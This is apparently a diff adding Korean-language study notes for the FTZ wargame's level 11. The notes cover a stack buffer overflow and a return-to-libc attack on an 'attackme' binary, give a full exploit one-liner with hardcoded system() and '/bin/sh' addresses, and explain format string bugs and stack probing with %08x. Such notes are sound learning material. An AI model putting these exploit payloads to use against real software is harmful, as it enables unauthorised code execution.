@@ -1,0 +1,125 @@
+
+   bof
+   fsb (format string bug?)  로 진행할 예정
+
+
+  4. 'attackme' 스택 프레임 구조
+  [낮은 주소]
+
+              str     256byte
+              dummy   8byte
+              sfp     4byte
+              ret     4byte
+
+  [높은 주소]
+
+  5. BoF 공격
+  - ret 영역에 system 함수 주소 삽입
+  - argv 영역에 '/bin/sh' 삽입
+  [낮은 주소]
+
+              str     256byte
+              dummy   8byte
+              sfp     4byte
+              ret     4byte   <- system 함수 주소값
+              argc    4byte
+              argv    4byte   <- /bin/sh 주소 값
+
+  [높은 주소]
+
+  1) system 함수 주소 값
+
+  (gdb) print system
+  $1 = {<text variable, no debug info>} 0x4203f2c0 <system>
+  - 기능이 켜져잇다면 system 함수 뿐아니라 메모리주소 계속바뀌는게 정상
+  - [참고] ASRL 기능 (공부할때는 이게좋음 )
+  - 스택에 메모리 주소를 계속 랜덤하게 변경하는 메모리 보호 기법
+
+  2) vi shell.c(bin/sh 주소 찾기)
+
+
+  6. RTL(Return To Library)공격
+  - BoF를 발생 시키는 공격 유형
+  - NX bit 메모리 보호 기법을 사용하는 환경에서 실시하는 BoF 공격 기법
+  - NX bit : 쉘 코드 삽입 굥격을 방어하기 위해서 스택 세그먼트에
+             실행 권한을 제한하여 스택에 쉘 코드를 저장 및 실행을 막는 메모리 보호 기법
+
+
+  1) BoF
+  [낮은 주소]
+
+              str     256byte
+              dummy   8byte
+              sfp     4byte
+              ret     4byte <- system 함수 주소 값(0x4203f2c0)
+              argc    4byte
+              argv    4byte <- /bin/sh 주소 값(0x42127ea4)
+
+  [높은 주소]
+
+  2) system 함수 주소 & /bin/sh 주소 -> 리틀 엔디안 방식으로 변경
+
+  ex )  system 함수   0x4203f2c0   \xc0\xf2\x03\x42
+        /bin/sh       0x42127ea4   \xa4\x7e\x12\x42
+
+  3) RTL을 이용한 BoF 공격 페이로드 제작
+
+  ex )  "a"*268+"\xc0\xf2\x03\x42"+"aaaa"+"\xa4\x7e\x12\x42"
+
+  ./attackme `python -c 'print("a"*268+"\xc0\xf2\x03\x42"+"aaaa"+"\xa4\x7e\x12\x42")'`
+
+  level12 비밀번호 = it is like this
+
+  [참고] BoF 취약한 함수
+
+  함수                                내용
+  gets()                              입력 받은 문자열의 길이를 확인하지 않기 때문에 취약함
+  scanf()                             입력 받은 문자열의 길이를 확인하지 않기 때문에 취약함
+  strcat()                            변수의 길이를 확인하지 않기 때문에 취약함
+  strcpy()                            입력 값의 길이를 확인하지 않기 때문에 취약함
+  sprintf()                           버퍼로 사용될 변수로 출력되기 때문에 취약함
+
+
+  1. FSB(Format String Bug)
+  - printf() 함수를 사용할 때 인자로 '포멧 스트링'과 포멧 '스트링에 대응하는 인자'를 사용하지 않고
+    직접 변수를 인자로 지정할 경우, 악의적인 포멧 스트링을 삽입하여 스택 내용을 확인하거나
+    메모리 주소 값을 변조하는 취약점이다.
+  - 이때, 포켓 스트링 중에 '%n'을 이용하면 스택의 값을 변조할 수 있다.
+
+  ex ) 포멧 스트링 버그
+
+  char buf[80];
+
+  printf("%s",buf);
+  printf(buf); <---- fsb 발생
+
+  - 만약, buf 변수에 문자열이 입력되면 문자열로 출력되지만, 포멧 스트링이 입력되면 포멧 스트링기능을 수행한다.
+
+
+  2. 포멧 스트링 유형
+
+  유형     내용
+  &d       정수형 10진수 상수(int)
+  %f       실수형 상수(float)
+  %fl      실수형 상수(double)
+  %c       문자 값(char)
+  %s       문자열
+  %u       양의 정수(10진수)
+  %o       양의 정수(8진수)
+  %x       양의 정수(16진수)
+  %n       사용한 총 바이트 수 (4byte 단위)
+  %hn      %n 절반 (2byte 단위)
+
+  3. '%n' 포멧 스트링 이해
+
+  'vi fsb3.c' 제작
+
+
+  4. 'attackme'파일 포멧 스트링 취약점 찾기
+
+  [level11@ftz level11]$ ./attackme abcd
+  abcd
+  [level11@ftz level11]$ ./attackme "%08x %08x %08x %08x"
+  bffffc11 bfffdbe0 00000001 78383025
+  [level11@ftz level11]$ ./attackme "aaaa %08x %08x %08x %08x"
+  aaaa bffffc0c bfffe550 00000001 (str의 시작 12byte) 61616161
